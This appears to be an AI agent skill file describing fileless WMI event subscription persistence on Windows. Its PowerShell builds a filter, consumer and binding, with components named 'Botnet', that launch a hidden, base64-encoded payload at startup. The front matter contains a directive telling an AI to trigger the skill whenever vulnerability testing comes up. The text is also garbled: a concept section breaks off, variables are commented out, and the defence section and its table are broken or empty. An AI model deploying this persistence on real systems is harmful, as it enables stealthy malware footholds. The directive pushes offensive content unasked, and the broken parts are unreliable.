---
name: wmi-event-subscription-persistence
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Establish highly stealthy, fileless persistence on Windows systems using WMI (Windows Management 
  Instrumentation) Event Subscriptions. This skill details creating the Filter, Consumer, and Binding 
  components to execute payloads upon specific system events (e.g., system startup, user logon).
domain: cybersecurity
subdomain: red-teaming
category: Persistence
difficulty: expert
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0003, TA0002]
  techniques: [T1546.003]
platforms: [windows]
tags: [wmi, persistence, red-teaming, fileless-malware, living-off-the-land]
tools: [powershell, wmic]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# WMI Event Subscription Persistence

## When to Use
- When operating as an administrator or SYSTEM and needing to establish durable persistence that survives reboots and evades standard Autoruns or Scheduled Task enumeration.
- To execute "fileless" payloads directly in memory (e.g., via CommandLineEventConsumer calling PowerShell) in response to arbitrary system events.

## Workflow

### Phase 1: Understanding the WMI Triad

```text
# Concept: WMI Persistence requires three ```

### Phase 2: Building the Event Filter (The Trigger)

```powershell
# $FilterNamespace = "root\subscription"
$FilterName = "BotnetStartupFilter"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"

Set-WmiInstance -Namespace $FilterNamespace -Class __EventFilter -Arguments @{
    Name = $FilterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $Query
}
```

### Phase 3: Building the Event Consumer (The Action)

```powershell
# $ConsumerName = "BotnetPayloadConsumer"
$CommandLineTemplate = "powershell.exe -NoP -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..." 

Set-WmiInstance -Namespace $FilterNamespace -Class CommandLineEventConsumer -Arguments @{
    Name = $ConsumerName
    CommandLineTemplate = $CommandLineTemplate
}
```

### Phase 4: Binding Filter and Consumer

```powershell
# $FilterPath = "__EventFilter.Name='$FilterName'"
$ConsumerPath = "CommandLineEventConsumer.Name='$ConsumerName'"

Set-WmiInstance -Namespace $FilterNamespace -Class __FilterToConsumerBinding -Arguments @{
    Filter = $FilterPath
    Consumer = $ConsumerPath
}
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Create Triad ] --> B{Subscribed? ]}
    B -->|Yes| C[Wait for Trigger ]
    B -->|No| D[Check Permissions ]
    C --> E[Execution ]
```

## 🔵 Blue Team Detection & Defense
- **Audit WMI Subscriptions**: **Sysmon Event IDs 19, 20, 21**: **Authorized Execution Controls (AppLocker)**: Key Concepts
| Concept | Description |
|---------|-------------|
| WMI Event Filters | |
| WMI Event Consumers | |

## References
- MITRE ATT&CK: [Event Triggered Execution: Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
- SpecterOps: [WMI Internals Part 3](https://posts.specterops.io/wmi-internals-part-3-38e5cb016e05)
